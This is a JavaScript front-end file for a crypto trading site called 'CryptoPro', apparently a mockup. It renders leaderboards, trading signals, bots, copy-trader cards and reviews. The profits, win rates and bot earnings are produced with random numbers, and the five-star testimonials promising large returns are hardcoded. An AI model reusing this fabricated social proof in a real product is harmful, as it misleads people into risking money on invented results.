const TRADER_NAMES=['CryptoKing','BitBull','LunaTrader','SatoshiPro','HODLmaster','AltcoinAlpha','WhaleWatcher','GridGuru','MoonTrader','DegenQueen'];
const TRADER_EMOJIS=['ðŸ¦','ðŸ‚','ðŸŒ™','ðŸš€','ðŸ’Ž','ðŸ¦…','ðŸ‹','ðŸ“Š','ðŸŒ•','ðŸ‘‘'];
function buildTradersTrack(){
  const track=$('tradersTrack');
  if(!track) return;
  let html='';
  for(let i=0;i<12;i++){
    const idx=i%TRADER_NAMES.length;
    const profit=rand(50,8400).toFixed(2);
    const mins=randInt(1,59);
    html+=`<div class="trader-chip" onclick="showLayer('copyTradingLayer')">
      <div class="trader-avatar">${TRADER_EMOJIS[idx]}</div>
      <div><div class="trader-name">${TRADER_NAMES[idx]}</div><div class="trader-time">${mins}m ago</div></div>
      <div style="margin-left:auto"><div class="trader-profit">+$${formatNum(profit)}</div></div>
    </div>`;
  }
  track.innerHTML=html+html;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// WINNERS GRID
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildWinnersGrid(){
  const grid=$('winnersGrid');
  if(!grid) return;
  const winners=[
    {name:'BitcoinBull2099',loc:'ðŸ‡ºðŸ‡¸ New York',emoji:'ðŸ¦',profit:142840,roi:284.2,trades:847,rank:'ðŸ¥‡'},
    {name:'CryptoQueen88',loc:'ðŸ‡¬ðŸ‡§ London',emoji:'ðŸ‘‘',profit:84220,roi:168.4,trades:1204,rank:'ðŸ¥ˆ'},
    {name:'AlphaTrader',loc:'ðŸ‡©ðŸ‡ª Berlin',emoji:'ðŸ‚',profit:61450,roi:122.9,trades:623,rank:'ðŸ¥‰'},
    {name:'SatoshiPro',loc:'ðŸ‡¯ðŸ‡µ Tokyo',emoji:'ðŸŒ™',profit:44200,roi:88.4,trades:412,rank:'4'},
    {name:'MoonRocket',loc:'ðŸ‡¦ðŸ‡ª Dubai',emoji:'ðŸš€',profit:38700,roi:77.4,trades:334,rank:'5'},
    {name:'GridMaster',loc:'ðŸ‡¸ðŸ‡¬ Singapore',emoji:'ðŸ“Š',profit:29400,roi:58.8,trades:2140,rank:'6'},
  ];
  grid.innerHTML=winners.map(w=>`
    <div class="winner-card" onclick="showLayer('copyTradingLayer')">
      <div class="winner-rank">${w.rank}</div>
      <div class="winner-head">
        <div class="winner-ava">${w.emoji}</div>
        <div><div class="winner-name">${w.name}</div><div class="winner-loc">${w.loc}</div></div>
      </div>
      <div class="winner-stats">
        <div class="winner-stat"><div class="ws-val text-green">+$${formatNum(w.profit)}</div><div class="ws-lbl">Week Profit</div></div>
        <div class="winner-stat"><div class="ws-val text-green">+${w.roi}%</div><div class="ws-lbl">ROI</div></div>
        <div class="winner-stat"><div class="ws-val">${w.trades}</div><div class="ws-lbl">Trades</div></div>
        <div class="winner-stat"><div class="ws-val" style="color:var(--cyan)">${(rand(80,98)).toFixed(1)}%</div><div class="ws-lbl">Win Rate</div></div>
      </div>
    </div>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// REVIEWS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildReviews(){
  const grid=$('reviewsGrid');
  if(!grid) return;
  const reviews=[
    {name:'Michael Chen',loc:'ðŸ‡ºðŸ‡¸ San Francisco',emoji:'ðŸ˜Š',stars:5,body:'"The AI signals are insanely accurate. Made $4,200 in my first month just following the BUY signals. The grid bot alone has paid for years of subscription."'},
    {name:'Sarah Williams',loc:'ðŸ‡¬ðŸ‡§ Manchester',emoji:'ðŸ¤©',stars:5,body:'"I was completely new to crypto. The AI assistant walked me through everything. Copy trading the top traders turned $500 into $2,800 in 6 weeks."'},
    {name:'Klaus Hoffman',loc:'ðŸ‡©ðŸ‡ª Munich',emoji:'ðŸ’ª',stars:5,body:'"The order book depth, the TradingView integration, the speed â€” this is what professional trading looks like. Moved all my capital here from Binance."'},
    {name:'Yuki Tanaka',loc:'ðŸ‡¯ðŸ‡µ Osaka',emoji:'ðŸš€',stars:5,body:'"Running 3 bots simultaneously. Grid bot on BTC, DCA on ETH, and momentum on SOL. Portfolio up 67% in 3 months with minimal effort."'},
    {name:'Carlos Rodriguez',loc:'ðŸ‡ªðŸ‡¸ Madrid',emoji:'ðŸŽ¯',stars:5,body:'"The referral program is generous â€” earned $450 just from referring friends. Platform is fast, secure, and the signals never miss."'},
    {name:'Emma Laurent',loc:'ðŸ‡«ðŸ‡· Paris',emoji:'ðŸ’Ž',stars:5,body:'"Compared 20 platforms. CryptoPro wins on every metric: fees, speed, tools, support. The achievement system keeps me engaged every day."'},
  ];
  grid.innerHTML=reviews.map(r=>`
    <div class="review-card">
      <div class="review-head">
        <div class="review-ava">${r.emoji}</div>
        <div>
          <div class="review-name">${r.name}</div>
          <div class="review-loc">${r.loc}</div>
          <div class="review-stars">${'â˜…'.repeat(r.stars)}</div>
        </div>
      </div>
      <div class="review-body">${r.body}</div>
    </div>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SIGNALS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const SIGNAL_DATA=[
  {pair:'BTC/USDT',dir:'buy',conf:94,entry:67420,tp:72000,sl:64000,rr:'2.8:1',timeframe:'4H',inds:['RSI Oversold','MACD Cross','Volume Surge'],reason:'Strong bullish divergence on 4H with institutional accumulation pattern'},
  {pair:'ETH/USDT',dir:'buy',conf:89,entry:3542,tp:3900,sl:3300,rr:'2.5:1',timeframe:'1D',inds:['EMA Cross','BB Squeeze','On-chain Inflow'],reason:'Daily EMA200 bounce with increasing on-chain activity'},
  {pair:'SOL/USDT',dir:'buy',conf:91,entry:182,tp:210,sl:165,rr:'2.7:1',timeframe:'1H',inds:['Momentum','VWAP Hold','Order Flow'],reason:'VWAP reclaim on 1H with strong buyer order flow'},
  {pair:'BNB/USDT',dir:'sell',conf:82,entry:412,tp:385,sl:430,rr:'2.1:1',timeframe:'4H',inds:['RSI Overbought','Divergence','Resistance'],reason:'Double top formation at key resistance with RSI bearish divergence'},
  {pair:'XRP/USDT',dir:'buy',conf:87,entry:0.612,tp:0.720,sl:0.560,rr:'2.3:1',timeframe:'1D',inds:['Pennant Break','Volume','Trend'],reason:'Bullish pennant breakout on daily with increasing volume confirmation'},
  {pair:'DOGE/USDT',dir:'sell',conf:78,entry:0.164,tp:0.140,sl:0.180,rr:'2.0:1',timeframe:'1H',inds:['Overbought','Social Peak','Resistance'],reason:'Social sentiment peak with price rejection at horizontal resistance'},
  {pair:'AVAX/USDT',dir:'buy',conf:86,entry:38.4,tp:46,sl:34,rr:'3.1:1',timeframe:'4H',inds:['Cup Handle','MACD','Volume'],reason:'Classic cup and handle pattern completing with bullish MACD'},
  {pair:'LINK/USDT',dir:'buy',conf:83,entry:16.84,tp:20,sl:14.5,rr:'2.9:1',timeframe:'1D',inds:['Support Hold','RSI Mid','Accumulation'],reason:'Key support level held with RSI recovering from oversold territory'},
];
function buildSignals(){
  const grid=$('signalsGrid');
  if(!grid) return;
  const filter=$('signalFilter')?.value||'all';
  let data=SIGNAL_DATA;
  if(filter==='buy') data=data.filter(s=>s.dir==='buy');
  if(filter==='sell') data=data.filter(s=>s.dir==='sell');
  if(filter==='high') data=data.filter(s=>s.conf>=87);
  grid.innerHTML=data.map(s=>`
    <div class="signal-card ${s.dir==='buy'?'buy-sig':'sell-sig'}" onclick="openSignalTrade('${s.pair}','${s.dir}',${s.entry})">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
        <span class="sig-direction ${s.dir}">${s.dir==='buy'?'â–² BUY':'â–¼ SELL'} ${s.pair}</span>
        <span style="font-size:11px;color:var(--text3);font-family:var(--font-mono)">${s.timeframe} Â· ${timeAgo()}</span>
      </div>
      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px">
        <div class="sig-stat"><div class="sig-stat-lbl">Entry</div><div class="sig-stat-val">${s.entry}</div></div>
        <div class="sig-stat"><div class="sig-stat-lbl">Target</div><div class="sig-stat-val text-green">${s.tp}</div></div>
        <div class="sig-stat"><div class="sig-stat-lbl">Stop</div><div class="sig-stat-val text-red">${s.sl}</div></div>
        <div class="sig-stat"><div class="sig-stat-lbl">R/R</div><div class="sig-stat-val text-yellow">${s.rr}</div></div>
      </div>
      <div style="margin-bottom:8px">
        <div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px">
          <span style="color:var(--text3)">AI Confidence</span>
          <span style="font-family:var(--font-mono);font-weight:800;color:${s.conf>=85?'var(--green)':'var(--yellow)'}">${s.conf}%</span>
        </div>
        <div class="conf-bar"><div class="conf-fill" style="width:${s.conf}%;background:${s.conf>=85?'var(--green)':'var(--yellow)'}"></div></div>
      </div>
      <div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px">
        ${s.inds.map(i=>`<span class="ind-tag ${s.dir==='buy'?'ind-bull':'ind-bear'}">${i}</span>`).join('')}
      </div>
      <div style="font-size:11px;color:var(--text3);line-height:1.5">${s.reason}</div>
      <button style="width:100%;margin-top:10px;padding:9px;background:${s.dir==='buy'?'var(--green)':'var(--red)'};border:none;border-radius:var(--r-md);color:${s.dir==='buy'?'#000':'#fff'};font-size:12px;font-weight:700;cursor:pointer;transition:opacity .2s" onmouseover="this.style.opacity='.85'" onmouseout="this.style.opacity='1'" onclick="event.stopPropagation();openSignalTrade('${s.pair}','${s.dir}',${s.entry})">
        ${s.dir==='buy'?'â–² Trade BUY Signal':'â–¼ Trade SELL Signal'}
      </button>
    </div>`).join('');
}
function timeAgo(){ return `${randInt(1,55)}m ago`; }
function filterSignals(){ buildSignals(); }
function openSignalTrade(pair,dir,entry){
  STATE.selectedPair=pair;
  STATE.orderSide=dir;
  showLayer('tradingLayer');
  setTimeout(()=>{
    setOrderSide(dir);
    const op=$('orderPrice'); if(op) op.value=entry;
  },300);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BOTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const BOTS_DATA=[
  {id:'grid',name:'Grid Bot',icon:'ðŸ“Š',risk:'Low Risk',riskColor:'var(--green)',desc:'Creates a grid of buy and sell orders within a range. Perfect for sideways markets with low volatility.',roi:'+24.8%',trades:'2,847',winrate:'94%',runtime:'47 days',pairs:'BTC, ETH, BNB',bg:'rgba(0,230,118,0.08)'},
  {id:'dca',name:'DCA Bot',icon:'ðŸ“ˆ',risk:'Low Risk',riskColor:'var(--green)',desc:'Buys a fixed amount at regular intervals. Averages down your entry price and eliminates timing risk.',roi:'+18.4%',trades:'142',winrate:'N/A',runtime:'90 days',pairs:'BTC, ETH, SOL',bg:'rgba(68,138,255,0.08)'},
  {id:'momentum',name:'Momentum Bot',icon:'âš¡',risk:'Med Risk',riskColor:'var(--yellow)',desc:'Follows strong trending markets using RSI, MACD and volume. Enters on breakouts, exits on reversal.',roi:'+67.2%',trades:'384',winrate:'72%',runtime:'30 days',pairs:'All major pairs',bg:'rgba(255,215,64,0.08)'},
  {id:'arb',name:'Arbitrage Bot',icon:'ðŸ”„',risk:'Low Risk',riskColor:'var(--green)',desc:'Exploits price differences between exchanges for near risk-free profits. Requires fast execution.',roi:'+12.1%',trades:'18,420',winrate:'99%',runtime:'24/7',pairs:'BTC, ETH, USDT',bg:'rgba(0,229,255,0.08)'},
  {id:'scalp',name:'Scalping Bot',icon:'ðŸŽ¯',risk:'High Risk',riskColor:'var(--red)',desc:'Enters and exits dozens of trades per day on very small price movements. High frequency, high reward.',roi:'+89.4%',trades:'28,400',winrate:'68%',runtime:'12 days',pairs:'BTC perp, ETH perp',bg:'rgba(255,61,87,0.08)'},
  {id:'ai',name:'AI Adaptive Bot',icon:'ðŸ¤–',risk:'Med Risk',riskColor:'var(--yellow)',desc:'Uses machine learning to adapt strategy based on market conditions. Automatically switches between grid, momentum, and DCA.',roi:'+112.4%',trades:'1,204',winrate:'81%',runtime:'60 days',pairs:'Top 10 pairs',bg:'rgba(170,119,255,0.08)'},
];
function buildBots(){
  const grid=$('botsGrid');
  if(!grid) return;
  let totalProfit=0;
  grid.innerHTML=BOTS_DATA.map(b=>{
    const isActive=STATE.bots[b.id];
    if(isActive) totalProfit+=parseFloat(b.roi)*rand(5,40);
    return `<div class="bot-card ${isActive?'active-bot':''}" style="background:${b.bg}">
      <div class="bc-top">
        <div class="bc-icon" style="background:${b.bg};font-size:22px">${b.icon}</div>
        <div>
          <div class="bc-name">${b.name}</div>
          <div class="bc-risk" style="color:${b.riskColor}">${b.risk}</div>
        </div>
        <div class="bc-status ${isActive?'on':'off'}" style="margin-left:auto">${isActive?'â— RUNNING':'â—‹ IDLE'}</div>
      </div>
      <div class="bc-desc">${b.desc}</div>
      <div class="bc-stats">
        <div class="bc-stat"><div class="bcs-val text-green">${b.roi}</div><div class="bcs-lbl">ROI</div></div>
        <div class="bc-stat"><div class="bcs-val">${b.trades}</div><div class="bcs-lbl">Trades</div></div>
        <div class="bc-stat"><div class="bcs-val" style="color:var(--cyan)">${b.winrate}</div><div class="bcs-lbl">Win Rate</div></div>
        <div class="bc-stat"><div class="bcs-val" style="color:var(--yellow)">${b.runtime}</div><div class="bcs-lbl">Runtime</div></div>
      </div>
      <div class="bc-pairs">Pairs: ${b.pairs}</div>
      <button class="bc-toggle-btn ${isActive?'stop':'start'}" onclick="toggleBot('${b.id}',this)">${isActive?'â¹ Stop Bot':'â–¶ Start Bot'}</button>
      ${isActive?`<div class="bc-running"><div class="live-dot" style="margin-right:6px"></div>Running â€” earning profits</div>`:''}
    </div>`;
  }).join('');
  const tp=$('totalBotProfit');
  if(tp) tp.textContent=totalProfit>0?'+$'+formatNum(totalProfit,2):'$0.00';
}
function toggleBot(id, btn){
  if(!STATE.loggedIn){ showLayer('loginLayer'); return; }
  STATE.bots[id]=!STATE.bots[id];
  buildBots();
  showToast(STATE.bots[id]?`ðŸ¤– ${id.toUpperCase()} Bot started! Trading automatically.`:`â¹ ${id.toUpperCase()} Bot stopped.`, STATE.bots[id]?'green':'yellow');
}
function showCreateBotModal(){ if(!STATE.loggedIn){showLayer('loginLayer');return;} openModal('createBotModal'); }
function saveCustomBot(){
  closeModal('createBotModal');
  showToast('ðŸ¤– Custom bot created and launched!','green');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// COPY TRADERS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const COPY_TRADERS=[
  {id:'ct1',name:'BitcoinBull2099',emoji:'ðŸ¦',country:'ðŸ‡ºðŸ‡¸',badge:'Elite',badgeClass:'ct-badge-gold',roi:'+284%',followers:'12.4K',winrate:'89%',trades:'847',maxDD:'-8.2%',monthly:'+42%',verified:true,min:'$10',risk:'Low'},
  {id:'ct2',name:'CryptoQueen88',emoji:'ðŸ‘‘',country:'ðŸ‡¬ðŸ‡§',badge:'Pro',badgeClass:'ct-badge-blue',roi:'+168%',followers:'8.2K',winrate:'84%',trades:'1,204',maxDD:'-12.4%',monthly:'+28%',verified:true,min:'$20',risk:'Med'},
  {id:'ct3',name:'AlphaGrid',emoji:'ðŸ“Š',country:'ðŸ‡©ðŸ‡ª',badge:'Grid Master',badgeClass:'ct-badge-purple',roi:'+112%',followers:'5.8K',winrate:'94%',trades:'18,420',maxDD:'-4.1%',monthly:'+18%',verified:true,min:'$50',risk:'Low'},
  {id:'ct4',name:'MoonRocket',emoji:'ðŸš€',country:'ðŸ‡¦ðŸ‡ª',badge:'Rising Star',badgeClass:'ct-badge-green',roi:'+440%',followers:'3.1K',winrate:'71%',trades:'2,140',maxDD:'-28%',monthly:'+74%',verified:false,min:'$100',risk:'High'},
  {id:'ct5',name:'SteadyGains',emoji:'ðŸ¦',country:'ðŸ‡¸ðŸ‡¬',badge:'Consistent',badgeClass:'ct-badge-green',roi:'+89%',followers:'6.7K',winrate:'87%',trades:'624',maxDD:'-6.8%',monthly:'+12%',verified:true,min:'$10',risk:'Low'},
  {id:'ct6',name:'WhaleWatcher',emoji:'ðŸ‹',country:'ðŸ‡¯ðŸ‡µ',badge:'Veteran',badgeClass:'ct-badge-gold',roi:'+198%',followers:'9.4K',winrate:'82%',trades:'1,840',maxDD:'-14%',monthly:'+33%',verified:true,min:'$25',risk:'Med'},
];
function buildCopyTraders(){
  const grid=$('copyTradersGrid');
  if(!grid) return;
  const filter=$('copyFilter')?.value||'all';
  let data=COPY_TRADERS;
  if(filter==='top') data=data.slice(0,3);
  if(filter==='safe') data=data.filter(t=>t.risk==='Low');
  if(filter==='new') data=data.filter((t,i)=>i>3);
  let count=0, profit=0;
  Object.keys(STATE.copyTraders).forEach(id=>{ if(STATE.copyTraders[id]){ count++; profit+=rand(20,800); } });
  const cc=$('copyingCount'), cp=$('copyTotalProfit');
  if(cc) cc.textContent=count;
  if(cp) cp.textContent=profit>0?'+$'+formatNum(profit,2):'+$0.00';
  grid.innerHTML=data.map(t=>{
    const copying=STATE.copyTraders[t.id];
    return `<div class="copy-trader-card ${copying?'is-copying':''}">
      <div style="display:flex;align-items:flex-start;gap:12px;margin-bottom:14px">
        <div class="ct-avatar">
          ${t.emoji}
          ${t.verified?'<div class="ct-verified">âœ“</div>':''}
        </div>
        <div style="flex:1;min-width:0">
          <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:4px">
            <span style="font-weight:800;font-size:14px;font-family:var(--font-display)">${t.name}</span>
            <span class="ct-badge ${t.badgeClass}">${t.badge}</span>
          </div>
          <div style="font-size:12px;color:var(--text3)">${t.country} Â· Min: ${t.min} Â· Risk: ${t.risk}</div>
        </div>
        ${copying?'<div style="color:var(--green);font-size:11px;font-weight:700;font-family:var(--font-mono)">â— COPYING</div>':''}
      </div>
      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:12px">
        <div class="ct-stat"><span class="ct-stat-val text-green">${t.roi}</span><span class="ct-stat-lbl">Total ROI</span></div>
        <div class="ct-stat"><span class="ct-stat-val" style="color:var(--cyan)">${t.monthly}</span><span class="ct-stat-lbl">Monthly</span></div>
        <div class="ct-stat"><span class="ct-stat-val">${t.winrate}</span><span class="ct-stat-lbl">Win Rate</span></div>
        <div class="ct-stat"><span class="ct-stat-val text-red">${t.maxDD}</span><span class="ct-stat-lbl">Max DD</span></div>
      </div>
      <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text3);margin-bottom:12px">
        <span>ðŸ‘¥ ${t.followers} followers</span>
        <span>ðŸ“Š ${t.trades} trades</span>
      </div>
      <button class="copy-btn ${copying?'stop':'start'}" onclick="handleCopyTrade('${t.id}','${t.name}',this)">
        ${copying?'â¹ Stop Copying':'ðŸ‘¥ Copy Trader'}
      </button>
    </div>`;
  }).join('');
}
function filterCopyTraders(){ buildCopyTraders(); }
function handleCopyTrade(id, name, btn){
  if(!STATE.loggedIn){ showLayer('loginLayer'); return; }
  if(STATE.copyTraders[id]){
    STATE.copyTraders[id]=false;
    buildCopyTraders();
    showToast(`â¹ Stopped copying ${name}`,'yellow');
  } else {
    STATE.currentTrader={id,name};
    $('ctmTitle').textContent=`ðŸ‘¥ Copy ${name}`;
    $('ctmBody').innerHTML=`<div style="font-size:13px;color:var(--text2);margin-bottom:12px">Set how much to allocate for copying this trader's positions.</div>`;
    $('ctmAlloc').value='';
    openModal('copyTradeModal');
  }
}
function confirmCopyTrade(){
  const alloc=parseFloat($('ctmAlloc').value||0);
  if(alloc<10){ showToast('âš ï¸ Minimum allocation is $10','yellow'); return; }
  STATE.copyTraders[STATE.currentTrader.id]=true;
  closeModal('copyTradeModal');
  buildCopyTraders();
  showToast(`âœ… Now copying ${STATE.currentTrader.name}! Allocation: $${formatNum(alloc)}`, 'green');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// HEATMAP
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildHeatmap(){
  const grid=$('heatmapGrid');
  if(!grid) return;
  const coins=Object.keys(STATE.prices);
  grid.innerHTML=coins.map(pair=>{
    const sym=pair.replace('/USDT','');
    const chg=parseFloat(STATE.changes[pair]);
    const intensity=Math.min(Math.abs(chg)/10,1);
    const bg=chg>=0?`rgba(0,230,118,${0.1+intensity*0.5})`:`rgba(255,61,87,${0.1+intensity*0.5})`;
    const txt=chg>=0?'var(--green)':'var(--red)';
    return `<div class="hm-cell" style="background:${bg}" onclick="STATE.selectedPair='${pair}';showLayer('chartLayer')">
      <div class="hm-sym">${sym}</div>
      <div class="hm-chg" style="color:${txt}">${formatPct(chg)}</div>
      <div style="font-size:10px;color:rgba(255,255,255,.4);margin-top:3px">$${formatNum(STATE.prices[pair],pair.includes('DOGE')||pair.includes('ADA')||pair.includes('MATIC')?4:2)}</div>
    </div>`;
  }).join('');
}
function setHeatmapPeriod(p,el){
  document.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  buildHeatmap();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LEADERBOARD
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const LB_DATA=[
  {rank:1,name:'BitcoinBull2099',country:'ðŸ‡ºðŸ‡¸',emoji:'ðŸ¦',profit:142840,roi:'284%'},
  {rank:2,name:'CryptoQueen88',country:'ðŸ‡¬ðŸ‡§',emoji:'ðŸ‘‘',profit:84220,roi:'168%'},
  {rank:3,name:'AlphaTrader',country:'ðŸ‡©ðŸ‡ª',emoji:'ðŸ‚',profit:61450,roi:'123%'},
  {rank:4,name:'SatoshiPro',country:'ðŸ‡¯ðŸ‡µ',emoji:'ðŸŒ™',profit:44200,roi:'88%'},
  {rank:5,name:'MoonRocket',country:'ðŸ‡¦ðŸ‡ª',emoji:'ðŸš€',profit:38700,roi:'77%'},
  {rank:6,name:'GridMaster',country:'ðŸ‡¸ðŸ‡¬',emoji:'ðŸ“Š',profit:29400,roi:'59%'},
  {rank:7,name:'DeFiKing',country:'ðŸ‡«ðŸ‡·',emoji:'ðŸ’Ž',profit:24800,roi:'50%'},
  {rank:8,name:'WhaleAlert',country:'ðŸ‡°ðŸ‡·',emoji:'ðŸ‹',profit:21200,roi:'42%'},
  {rank:9,name:'HODLer99',country:'ðŸ‡§ðŸ‡·',emoji:'ðŸ¦…',profit:18600,roi:'37%'},
  {rank:10,name:'AltSeason',country:'ðŸ‡®ðŸ‡³',emoji:'ðŸŽ¯',profit:16400,roi:'33%'},
];
function buildLeaderboard(){
  const list=$('lbList');
  if(!list) return;
  list.innerHTML=LB_DATA.map(t=>`
    <div class="lb-row" onclick="showLayer('copyTradingLayer')">
      <div class="lb-rank" style="color:${t.rank===1?'var(--yellow)':t.rank===2?'#C0C0C0':t.rank===3?'#CD7F32':'var(--text3)'}">${t.rank<=3?['ðŸ¥‡','ðŸ¥ˆ','ðŸ¥‰'][t.rank-1]:t.rank}</div>
      <div class="lb-avatar" style="background:linear-gradient(135deg,var(--bg3),var(--bg4))">${t.emoji}</div>
      <div style="flex:1;min-width:0"><div class="lb-name">${t.name}</div><div class="lb-country">${t.country}</div></div>
      <div style="text-align:right"><div class="lb-profit">+$${formatNum(t.profit)}</div><div class="lb-roi">${t.roi} ROI</div></div>
    </div>`).join('');
  // top 3 podium
  const names=['lb1Name','lb2Name','lb3Name'], profits=['lb1Profit','lb2Profit','lb3Profit'];
  [0,1,2].forEach(i=>{ $(names[i]).textContent=LB_DATA[i].name; $(profits[i]).textContent='+$'+formatNum(LB_DATA[i].profit); });
}
function setLBPeriod(p,el){
  document.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  buildLeaderboard();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ACHIEVEMENTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const ACHIEVEMENTS=[
  {icon:'ðŸš€',name:'First Trade',desc:'Place your first trade',unlocked:true,progress:100},
  {icon:'ðŸ’°',name:'Profit Maker',desc:'Earn $100 in profits',unlocked:true,progress:100},
  {icon:'ðŸ”¥',name:'7-Day Streak',desc:'Trade 7 days in a row',unlocked:true,progress:100},
  {icon:'ðŸ¤–',name:'Bot Master',desc:'Run a bot for 30 days',unlocked:false,progress:60},
  {icon:'ðŸ‘¥',name:'Social Trader',desc:'Refer 5 friends',unlocked:false,progress:40},
  {icon:'ðŸ’Ž',name:'Diamond Hands',desc:'HODLa position for 30 days',unlocked:false,progress:80},
  {icon:'âš¡',name:'Speed Trader',desc:'Execute 100 trades',unlocked:false,progress:35},
  {icon:'ðŸ‹',name:'Big Whale',desc:'Trade $100K total volume',unlocked:false,progress:22},
  {icon:'ðŸ†',name:'Top Trader',desc:'Rank in top 100 globally',unlocked:false,progress:5},
  {icon:'ðŸŒŸ',name:'Diamond VIP',desc:'Reach Diamond tier',unlocked:false,progress:5},
  {icon:'ðŸŽ¯',name:'Signal Pro',desc:'Follow 50 signals',unlocked:true,progress:100},
  {icon:'ðŸ“Š',name:'Chart Analyst',desc:'Use 10 different indicators',unlocked:false,progress:70},
];
function buildAchievements(){
  const grid=$('achievementGrid');
  if(!grid) return;
  grid.innerHTML=ACHIEVEMENTS.map(a=>`
    <div class="achievement-card ${a.unlocked?'unlocked':'locked'}">
      ${a.unlocked?'<div class="ach-unlocked-glow"></div>':''}
      <span class="ach-icon">${a.icon}</span>
      <div class="ach-name">${a.name}</div>
      <div class="ach-desc">${a.desc}</div>
      ${!a.unlocked?`<div class="ach-progress"><div class="ach-progress-fill" style="width:${a.progress}%"></div></div><div style="font-size:9px;color:var(--text3);margin-top:3px;font-family:var(--font-mono)">${a.progress}%</div>`:'<div style="font-size:10px;color:var(--yellow);font-weight:700;margin-top:4px">âœ“ Unlocked</div>'}
    </div>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DASHBOARD SECTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function showDashSection(sec){
  ['overview','positions','history','referral','settings'].forEach(s=>{
    const el=$(`dashSection${s.charAt(0).toUpperCase()+s.slice(1)}`);
    if(el) el.style.display = s===sec?'':'none';
  });
  if(sec==='overview'){ drawPerfChart(); drawAllocChart(); drawBalMiniChart(); buildDashPositions(); buildRecentTrades(); buildMarketSnap(); buildLiveTxFeed(); buildStreakDots(); buildRecActions(); }
  if(sec==='positions'){ buildPositionsSection(); buildPosHistory(); }
  if(sec==='history'){ buildTradeHistory(); }
  if(sec==='settings'){ buildDeviceList(); buildIPWhitelist(); buildPriceAlertsList(); }
}
function setSnav(el){
  document.querySelectorAll('.snav-item').forEach(i=>i.classList.remove('active'));
  el.classList.add('active');
}

